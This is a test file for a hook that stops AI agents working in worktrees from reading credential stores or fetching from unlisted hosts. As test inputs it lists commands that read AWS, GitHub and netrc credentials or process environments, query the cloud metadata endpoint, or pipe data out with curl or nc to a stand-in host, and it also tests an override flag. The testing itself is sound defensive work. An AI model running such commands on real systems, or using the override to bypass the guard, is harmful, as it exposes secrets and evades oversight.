# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
# SPDX-License-Identifier: MIT-0

"""Tests for ``scripts/hooks/check_worktree_reach.py``.

Written around the boundary in both directions: each refusal from an agent
worktree has a matching allow from the main checkout, and each refused fetch has
an allowed one to a listed host, so a hook that refused everything fails here.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

HOOK = Path(__file__).resolve().parents[1] / "hooks" / "check_worktree_reach.py"
HOME = "/home/runner"
AGENT_CWD = f"{HOME}/wt/2026-11-10-1/fix-ocr"
MAIN_CWD = f"{HOME}/projects/idp1"


def run_hook(
    command: str, cwd: str = AGENT_CWD, env_extra: dict[str, str] | None = None
) -> subprocess.CompletedProcess[str]:
    payload = {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": cwd}
    env = {"HOME": HOME, "PATH": "/usr/bin:/bin", **(env_extra or {})}
    return subprocess.run(  # noqa: S603 - fixed argv
        [sys.executable, str(HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )


READS = [
    "cat ~/.aws/credentials",
    "cat $HOME/.aws/config",
    "cat ${HOME}/.aws/sso/cache/x.json",
    f"cat {HOME}/.aws/credentials",
    "ls -la ~/.aws",
    "grep token ~/.config/gh/hosts.yml",
    "cat ~/.netrc",
    "AWS_SHARED_CREDENTIALS_FILE=~/.aws/credentials aws sts get-caller-identity",
    "cat /proc/self/environ",
    "tr '\\0' '\\n' < /proc/1234/environ",
    "cat /proc/$PPID/environ",
    "cat /proc/*/environ",
    "pytest -q && cat ~/.aws/credentials",
]


@pytest.mark.parametrize("command", READS)
def test_a_credential_store_is_refused_in_a_worktree(command: str) -> None:
    result = run_hook(command)
    assert result.returncode == 2, (command, result.stderr)
    assert "check-worktree-reach: refusing" in result.stderr


@pytest.mark.parametrize("command", READS)
def test_the_main_checkout_is_never_refused(command: str) -> None:
    assert run_hook(command, cwd=MAIN_CWD).returncode == 0


@pytest.mark.parametrize(
    "command",
    [
        "cat ./.aws-notes.md",
        "cat docs/aws.md",
        "ls lib/x/.awsome",
        "grep environ scripts/x.py",
        "cat .netrc.example",
        "pytest -q",
    ],
)
def test_lookalike_paths_are_allowed(command: str) -> None:
    assert run_hook(command).returncode == 0, run_hook(command).stderr


@pytest.mark.parametrize(
    "command",
    [
        "curl https://remote.example/x",
        "curl -s -H 'Accept: x' https://remote.example/x",
        "curl remote.example/x",
        "wget -q https://remote.example/x",
        "nc remote.example 443",
        "curl https://pypi.org/simple/ https://remote.example/x",
        "curl $URL",
        "echo x | /usr/bin/curl -d @- https://remote.example",
        "curl http://169.254.169.254/latest/meta-data/",
    ],
)
def test_a_fetch_to_an_unlisted_host_is_refused(command: str) -> None:
    result = run_hook(command)
    assert result.returncode == 2, (command, result.stderr)
    assert "against" in result.stderr


@pytest.mark.parametrize(
    "command",
    [
        "curl -sL https://github.com/o/r/archive/x.tar.gz -o x.tgz",
        "curl https://api.github.com/repos/o/r",
        "curl -s https://raw.githubusercontent.com/o/r/main/f",
        "wget -q https://files.pythonhosted.org/packages/x.whl",
        "curl https://pypi.org/pypi/boto3/json",
        "curl https://registry.npmjs.org/react",
    ],
)
def test_a_fetch_to_a_listed_host_is_allowed(command: str) -> None:
    result = run_hook(command)
    assert result.returncode == 0, (command, result.stderr)


def test_the_repository_s_own_origin_host_is_allowed(tmp_path: Path) -> None:
    worktree = tmp_path / "wt" / "run" / "slug"
    worktree.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", str(worktree)], check=True)  # noqa: S603, S607
    subprocess.run(  # noqa: S603, S607
        ["git", "-C", str(worktree), "remote", "add", "origin",
         "git@ssh.forge.example:group/project.git"],
        check=True,
    )  # fmt: skip
    env = {"BACKLOG_WORKTREE_PREFIX": str(tmp_path / "wt")}
    allowed = run_hook("curl https://forge.example/api/v4/x", str(worktree), env)
    refused = run_hook("curl https://other.example/x", str(worktree), env)
    assert allowed.returncode == 0, allowed.stderr
    assert refused.returncode == 2


def test_the_inline_override_allows_and_says_so() -> None:
    result = run_hook("ALLOW_WORKTREE_REACH=1 cat ~/.aws/config")
    assert result.returncode == 0
    assert "refusal disabled by ALLOW_WORKTREE_REACH=1 from inline" in result.stderr


def test_the_environment_override_allows_and_says_so() -> None:
    result = run_hook("cat ~/.aws/config", env_extra={"ALLOW_WORKTREE_REACH": "1"})
    assert result.returncode == 0
    assert "from the environment" in result.stderr


def test_a_negative_override_value_leaves_the_check_on() -> None:
    assert run_hook("ALLOW_WORKTREE_REACH=0 cat ~/.aws/config").returncode == 2


def test_an_override_inside_a_quoted_argument_does_not_count() -> None:
    assert run_hook("echo 'ALLOW_WORKTREE_REACH=1' && cat ~/.netrc").returncode == 2


def test_the_prefix_can_be_overridden(tmp_path: Path) -> None:
    env = {"BACKLOG_WORKTREE_PREFIX": str(tmp_path)}
    assert run_hook("cat ~/.netrc", str(tmp_path / "x"), env).returncode == 2
    assert run_hook("cat ~/.netrc", AGENT_CWD, env).returncode == 0


def test_a_sibling_whose_name_starts_with_the_prefix_is_not_inside_it() -> None:
    assert run_hook("cat ~/.netrc", f"{HOME}/wtx/slug").returncode == 0


@pytest.mark.parametrize("payload", ["not json", json.dumps({"tool_name": "Read"})])
def test_it_fails_open_on_what_it_cannot_read(payload: str) -> None:
    result = subprocess.run(  # noqa: S603 - fixed argv
        [sys.executable, str(HOOK)],
        input=payload,
        capture_output=True,
        text=True,
        env={"HOME": HOME},
        check=False,
    )
    assert result.returncode == 0


def test_the_header_says_it_is_not_a_capability_boundary() -> None:
    assert "It is not a capability\nboundary." in HOOK.read_text().replace("**", "")


def test_it_is_registered_as_a_bash_pretooluse_hook() -> None:
    settings = json.loads(
        (Path(__file__).resolve().parents[2] / ".claude" / "settings.json").read_text()
    )
    commands = [
        hook["command"]
        for entry in settings["hooks"]["PreToolUse"]
        if entry.get("matcher") == "Bash"
        for hook in entry["hooks"]
    ]
    assert any("scripts/hooks/check_worktree_reach.py" in c for c in commands)


def test_the_fetch_host_list_is_pinned() -> None:
    """Adding a host widens where an agent's fetch may go, so the set is pinned
    here and a new member is a reviewed edit to this test as well."""
    namespace: dict = {}
    exec(compile(HOOK.read_text(), str(HOOK), "exec"), namespace)  # noqa: S102
    assert namespace["ALLOWED_FETCH_HOSTS"] == {
        "github.com",
        "api.github.com",
        "raw.githubusercontent.com",
        "objects.githubusercontent.com",
        "codeload.github.com",
        "pypi.org",
        "files.pythonhosted.org",
        "registry.npmjs.org",
        "www.npmjs.com",
    }
